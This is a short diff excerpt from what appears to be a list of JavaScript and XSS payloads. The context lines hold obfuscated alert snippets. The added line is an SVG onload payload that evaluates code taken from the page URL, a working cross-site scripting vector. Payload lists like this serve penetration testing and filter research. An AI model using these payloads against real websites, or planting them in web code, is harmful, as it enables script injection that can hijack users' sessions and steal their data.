@@ -222,3 +222,4 @@ delete []['__proto__']['toString'];[]['__proto__'][Symbol.toStringTag]='=alert(1
 ({' \'(){alert(1)}})[` \`]()
 -{valueOf(){alert`:D`}}
 (function({a,b,c}={a:1,b:2,c:3}){alert(`${a},${b},${c}`)})()
+<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
